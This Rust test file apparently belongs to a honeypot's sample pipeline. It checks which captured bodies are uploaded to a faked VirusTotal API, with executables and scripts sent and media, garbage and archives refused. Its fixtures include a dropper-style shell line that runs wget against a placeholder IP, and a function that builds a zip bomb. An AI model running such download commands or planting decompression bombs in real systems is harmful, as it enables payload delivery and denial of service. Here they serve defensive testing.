//! The VirusTotal scan loop with upload enabled: which captured bodies reach the uploader.
//!
//! Real Postgres (`sample_analysis`) and a real spool directory; the VT API is a recording fake,
//! so nothing here touches the network. Every body is a tiny synthetic fixture built in the test.
//! Rows for the fixtures' digests are cleared first because the database outlives a run.

use std::path::Path;
use std::sync::Mutex;

use chrono::Utc;
use review::virustotal::{DailyBudget, VtApi, VtConfig, VtResult, scan_spool_with};
use sha2::{Digest, Sha256};
use sqlx::PgPool;

#[derive(Default)]
struct FakeVt {
    lookups: Mutex<Vec<String>>,
    uploads: Mutex<Vec<String>>,
}

#[async_trait::async_trait]
impl VtApi for FakeVt {
    async fn lookup(&self, sha256: &str) -> Result<Option<VtResult>, String> {
        self.lookups.lock().unwrap().push(sha256.to_string());
        Ok(None)
    }

    async fn upload(&self, bytes: Vec<u8>, sha256: &str) -> Result<(), String> {
        assert_eq!(
            hex(&Sha256::digest(&bytes)),
            sha256,
            "uploaded bytes match the name"
        );
        self.uploads.lock().unwrap().push(sha256.to_string());
        Ok(())
    }
}

fn hex(digest: &[u8]) -> String {
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

async fn setup_pool() -> PgPool {
    let url = std::env::var("DATABASE_URL")
        .unwrap_or_else(|_| "postgres://propolis:propolis@localhost:5432/propolis_test".into());
    let pool = PgPool::connect(&url).await.unwrap();
    sqlx::migrate!("../core-scoring/migrations")
        .run(&pool)
        .await
        .unwrap();
    pool
}

fn config(upload_unknown: bool) -> VtConfig {
    VtConfig {
        api_key: "test-key-not-real".into(),
        upload_unknown,
        scan_interval_secs: 300,
        request_delay_ms: 0,
        daily_limit: 1000,
        pending_recheck_secs: 900,
    }
}

fn write_sample(dir: &Path, body: &[u8]) -> String {
    let sha = hex(&Sha256::digest(body));
    std::fs::write(dir.join(&sha), body).unwrap();
    sha
}

fn elf() -> Vec<u8> {
    let mut v = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0];
    v.resize(64, 0x11);
    v
}

fn mz() -> Vec<u8> {
    let mut v = vec![0x22u8; 0x48];
    v[..2].copy_from_slice(b"MZ");
    v[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    v[0x40..0x44].copy_from_slice(b"PE\0\0");
    v
}

fn png() -> Vec<u8> {
    let mut v = b"\x89PNG\r\n\x1a\n".to_vec();
    v.resize(48, 0x33);
    v
}

fn jpeg() -> Vec<u8> {
    let mut v = vec![0xff, 0xd8, 0xff, 0xe0, 0, 16];
    v.extend_from_slice(b"JFIF\0");
    v.resize(48, 0x44);
    v
}

fn mp4() -> Vec<u8> {
    let mut v = vec![0, 0, 0, 0x18];
    v.extend_from_slice(b"ftypisom");
    v.resize(48, 0x55);
    v
}

fn pdf() -> Vec<u8> {
    b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\ntrailer\n".to_vec()
}

/// Zip with stored members; central directory only as far as the scanner reads it.
fn zip(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut cd = Vec::new();
    for (name, data) in members {
        let off = out.len() as u32;
        out.extend_from_slice(b"PK\x03\x04");
        out.extend_from_slice(&[20, 0, 0, 0, 0, 0]);
        out.extend_from_slice(&[0; 8]);
        out.extend_from_slice(&(data.len() as u32).to_le_bytes());
        out.extend_from_slice(&(data.len() as u32).to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&[0, 0]);
        out.extend_from_slice(name.as_bytes());
        out.extend_from_slice(data);

        cd.extend_from_slice(b"PK\x01\x02");
        cd.extend_from_slice(&[20, 0, 20, 0, 0, 0, 0, 0]);
        cd.extend_from_slice(&[0; 8]);
        cd.extend_from_slice(&(data.len() as u32).to_le_bytes());
        cd.extend_from_slice(&(data.len() as u32).to_le_bytes());
        cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
        cd.extend_from_slice(&[0; 12]);
        cd.extend_from_slice(&off.to_le_bytes());
        cd.extend_from_slice(name.as_bytes());
    }
    let cd_off = out.len() as u32;
    out.extend_from_slice(&cd);
    out.extend_from_slice(b"PK\x05\x06\0\0\0\0");
    out.extend_from_slice(&(members.len() as u16).to_le_bytes());
    out.extend_from_slice(&(members.len() as u16).to_le_bytes());
    out.extend_from_slice(&(cd.len() as u32).to_le_bytes());
    out.extend_from_slice(&cd_off.to_le_bytes());
    out.extend_from_slice(&[0, 0]);
    out
}

/// A fixed-Huffman deflate stream expanding to `1 + 258 * matches` zero bytes, in a zip member
/// that claims to be that large.
fn bomb_zip(matches: usize) -> Vec<u8> {
    let mut bytes: Vec<u8> = Vec::new();
    let mut used = 0u32;
    let mut put = |bit: u32| {
        if used.is_multiple_of(8) {
            bytes.push(0);
        }
        if bit != 0 {
            *bytes.last_mut().unwrap() |= 1 << (used % 8);
        }
        used += 1;
    };
    put(1);
    put(1);
    put(0);
    let mut code = |v: u32, n: u32| {
        for i in (0..n).rev() {
            put((v >> i) & 1);
        }
    };
    code(0x30, 8);
    for _ in 0..matches {
        code(0xc5, 8);
        code(0, 5);
    }
    code(0, 7);
    let claimed = (1 + 258 * matches) as u32;
    let name = "bomb.bin";

    let mut out = Vec::new();
    out.extend_from_slice(b"PK\x03\x04");
    out.extend_from_slice(&[20, 0, 0, 0, 8, 0]);
    out.extend_from_slice(&[0; 8]);
    out.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
    out.extend_from_slice(&claimed.to_le_bytes());
    out.extend_from_slice(&(name.len() as u16).to_le_bytes());
    out.extend_from_slice(&[0, 0]);
    out.extend_from_slice(name.as_bytes());
    out.extend_from_slice(&bytes);
    let cd_off = out.len() as u32;
    let mut cd = Vec::new();
    cd.extend_from_slice(b"PK\x01\x02");
    cd.extend_from_slice(&[20, 0, 20, 0, 0, 0, 8, 0]);
    cd.extend_from_slice(&[0; 8]);
    cd.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
    cd.extend_from_slice(&claimed.to_le_bytes());
    cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
    cd.extend_from_slice(&[0; 12]);
    cd.extend_from_slice(&0u32.to_le_bytes());
    cd.extend_from_slice(name.as_bytes());
    out.extend_from_slice(&cd);
    out.extend_from_slice(b"PK\x05\x06\0\0\0\0\x01\0\x01\0");
    out.extend_from_slice(&(cd.len() as u32).to_le_bytes());
    out.extend_from_slice(&cd_off.to_le_bytes());
    out.extend_from_slice(&[0, 0]);
    out
}

async fn status_of(pool: &PgPool, sha: &str) -> Option<(i32, i32, String)> {
    sqlx::query_as("SELECT detected, total, vt_link FROM sample_analysis WHERE sha256 = $1")
        .bind(sha)
        .fetch_optional(pool)
        .await
        .unwrap()
}

async fn clear(pool: &PgPool, shas: &[String]) {
    sqlx::query("DELETE FROM sample_analysis WHERE sha256 = ANY($1)")
        .bind(shas)
        .execute(pool)
        .await
        .unwrap();
}

async fn run_scan(pool: &PgPool, fake: &FakeVt, dir: &Path, upload_unknown: bool) -> Vec<VtResult> {
    let mut budget = DailyBudget::new(1000, Utc::now().date_naive());
    scan_spool_with(
        fake,
        pool,
        &config(upload_unknown),
        &[("ssh", dir.to_path_buf())],
        &mut budget,
    )
    .await
}

#[tokio::test]
async fn only_executable_and_script_content_reaches_the_uploader() {
    let pool = setup_pool().await;
    let dir = tempfile::tempdir().unwrap();

    let dex = {
        let mut d = b"dex\n035\0".to_vec();
        d.resize(112, 0x66);
        d
    };
    let allowed: Vec<(&str, Vec<u8>)> = vec![
        ("elf", elf()),
        ("mz", mz()),
        ("apk-like zip", zip(&[("classes.dex", &dex)])),
        (
            "shell script",
            b"#!/bin/sh\ncd /tmp; wget http://192.0.2.7/a\n".to_vec(),
        ),
    ];
    let mut huge_entries: Vec<(String, Vec<u8>)> =
        (0..80).map(|i| (format!("p{i}.png"), png())).collect();
    huge_entries.push(("late.bin".into(), elf()));
    let many: Vec<(&str, &[u8])> = huge_entries
        .iter()
        .map(|(n, d)| (n.as_str(), d.as_slice()))
        .collect();
    let refused: Vec<(&str, Vec<u8>)> = vec![
        ("png", png()),
        ("jpeg", jpeg()),
        ("mp4", mp4()),
        ("pdf", pdf()),
        // The member is CALLED payload.elf; its content is a PNG, and content decides.
        (
            "zip with only a png called payload.elf",
            zip(&[("payload.elf", &png())]),
        ),
        ("zip bomb", bomb_zip(5000)),
        ("zip with the executable past the entry cap", zip(&many)),
        (
            "garbage",
            vec![
                0xde, 0xad, 0xbe, 0xef, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
            ],
        ),
        (
            "detection error: truncated zip",
            b"PK\x03\x04 not a real archive".to_vec(),
        ),
    ];

    let mut allowed_shas = Vec::new();
    let mut refused_shas = Vec::new();
    for (_, body) in &allowed {
        allowed_shas.push(write_sample(dir.path(), body));
    }
    for (_, body) in &refused {
        refused_shas.push(write_sample(dir.path(), body));
    }
    refused_shas.sort();
    refused_shas.dedup();
    let all: Vec<String> = allowed_shas.iter().chain(&refused_shas).cloned().collect();
    clear(&pool, &all).await;

    let fake = FakeVt::default();
    run_scan(&pool, &fake, dir.path(), true).await;

    let mut looked_up = fake.lookups.lock().unwrap().clone();
    looked_up.sort();
    let mut expected_all = all.clone();
    expected_all.sort();
    assert_eq!(
        looked_up, expected_all,
        "a hash lookup happens for every type"
    );

    let mut uploaded = fake.uploads.lock().unwrap().clone();
    uploaded.sort();
    let mut expected_up = allowed_shas.clone();
    expected_up.sort();
    assert_eq!(
        uploaded, expected_up,
        "exactly the executable and script bodies are uploaded"
    );

    for sha in &allowed_shas {
        let (d, t, _) = status_of(&pool, sha)
            .await
            .expect("uploaded sample has a row");
        assert_eq!((d, t), (-1, -1), "uploaded sample is pending a verdict");
    }
    for sha in &refused_shas {
        let (d, t, link) = status_of(&pool, sha)
            .await
            .expect("refused sample has a status row");
        assert_eq!(
            (d, t),
            (-2, -2),
            "refused sample is marked not uploaded for its type"
        );
        assert_eq!(link, "", "no VT page exists for a body that was never sent");
    }

    // A second cycle neither looks up nor uploads anything again.
    let again = FakeVt::default();
    run_scan(&pool, &again, dir.path(), true).await;
    assert!(
        again.lookups.lock().unwrap().is_empty(),
        "a refused body is not looked up every cycle"
    );
    assert!(again.uploads.lock().unwrap().is_empty());
}

#[tokio::test]
async fn nothing_is_uploaded_when_upload_is_off() {
    let pool = setup_pool().await;
    let dir = tempfile::tempdir().unwrap();
    let mut body = elf();
    body.extend_from_slice(b"upload-off fixture");
    let sha = write_sample(dir.path(), &body);
    clear(&pool, std::slice::from_ref(&sha)).await;

    let fake = FakeVt::default();
    run_scan(&pool, &fake, dir.path(), false).await;

    assert_eq!(*fake.lookups.lock().unwrap(), vec![sha.clone()]);
    assert!(fake.uploads.lock().unwrap().is_empty());
    assert!(status_of(&pool, &sha).await.is_none());
}
